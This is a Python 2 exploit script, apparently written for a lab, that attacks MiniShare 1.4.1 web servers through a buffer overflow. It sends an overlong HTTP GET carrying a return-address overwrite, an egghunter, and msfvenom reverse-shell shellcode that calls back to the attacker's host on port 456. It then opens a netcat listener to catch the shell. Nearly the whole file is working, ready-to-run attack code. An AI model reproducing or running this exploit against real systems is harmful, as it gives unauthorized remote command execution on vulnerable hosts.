#!/usr/bin/env python
# -*- coding:utf-8 -*-
import socket
import struct
import os

conexion=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

logo = """\n
	Script attack minishare 1.4.1
	Autor: Yonatan_Correa

	twitter: @Yonatan_correa
	Blog: https://risataim.blogspot.com

"""

print logo

host = "192.168.0.14" #ip de la maquina virtual

junk = "\x41" * 1787
eip = struct.pack('<I',0x771550e7)
nops = "\x90" * 32

tag = "yonayona"

egg = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x79\x6f\x6e\x61\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.19 LPORT=456 -a x86 --platform windows -b "\x00\x0d" -f c
shell = ("\xba\xaf\xf7\xb8\xb2\xd9\xea\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x50\x12\x03\x50\x12\x83\x6f\xf3\x5a\x47\x93\x14\x18"
"\xa8\x6b\xe5\x7d\x20\x8e\xd4\xbd\x56\xdb\x47\x0e\x1c\x89\x6b"
"\xe5\x70\x39\xff\x8b\x5c\x4e\x48\x21\xbb\x61\x49\x1a\xff\xe0"
"\xc9\x61\x2c\xc2\xf0\xa9\x21\x03\x34\xd7\xc8\x51\xed\x93\x7f"
"\x45\x9a\xee\x43\xee\xd0\xff\xc3\x13\xa0\xfe\xe2\x82\xba\x58"
"\x25\x25\x6e\xd1\x6c\x3d\x73\xdc\x27\xb6\x47\xaa\xb9\x1e\x96"
"\x53\x15\x5f\x16\xa6\x67\x98\x91\x59\x12\xd0\xe1\xe4\x25\x27"
"\x9b\x32\xa3\xb3\x3b\xb0\x13\x1f\xbd\x15\xc5\xd4\xb1\xd2\x81"
"\xb2\xd5\xe5\x46\xc9\xe2\x6e\x69\x1d\x63\x34\x4e\xb9\x2f\xee"
"\xef\x98\x95\x41\x0f\xfa\x75\x3d\xb5\x71\x9b\x2a\xc4\xd8\xf4"
"\x9f\xe5\xe2\x04\x88\x7e\x91\x36\x17\xd5\x3d\x7b\xd0\xf3\xba"
"\x7c\xcb\x44\x54\x83\xf4\xb4\x7d\x40\xa0\xe4\x15\x61\xc9\x6e"
"\xe5\x8e\x1c\x20\xb5\x20\xcf\x81\x65\x81\xbf\x69\x6f\x0e\x9f"
"\x8a\x90\xc4\x88\x21\x6b\x8f\x76\x1d\x73\x5d\x1f\x5c\x73\x60"
"\x17\xe9\x95\x08\xb7\xbc\x0e\xa5\x2e\xe5\xc4\x54\xae\x33\xa1"
"\x57\x24\xb0\x56\x19\xcd\xbd\x44\xce\x3d\x88\x36\x59\x41\x26"
"\x5e\x05\xd0\xad\x9e\x40\xc9\x79\xc9\x05\x3f\x70\x9f\xbb\x66"
"\x2a\xbd\x41\xfe\x15\x05\x9e\xc3\x98\x84\x53\x7f\xbf\x96\xad"
"\x80\xfb\xc2\x61\xd7\x55\xbc\xc7\x81\x17\x16\x9e\x7e\xfe\xfe"
"\x67\x4d\xc1\x78\x68\x98\xb7\x64\xd9\x75\x8e\x9b\xd6\x11\x06"
"\xe4\x0a\x82\xe9\x3f\x8f\xb2\xa3\x1d\xa6\x5a\x6a\xf4\xfa\x06"
"\x8d\x23\x38\x3f\x0e\xc1\xc1\xc4\x0e\xa0\xc4\x81\x88\x59\xb5"
"\x9a\x7c\x5d\x6a\x9a\x54")


todo = junk + eip + nops + egg

try:
	print "Enviando exploit"
	conexion.connect((host,80))

	buff = (
		"GET " + todo + " HTTP/1.1\r\n"
		"Host: "+tag + shell+"\r\n\r\n")

	conexion.send(buff)
	conexion.close()
	print "\n Enviando ", len(buff)
	os.system("nc -lvp 456")

except:

	print "error de conexion"
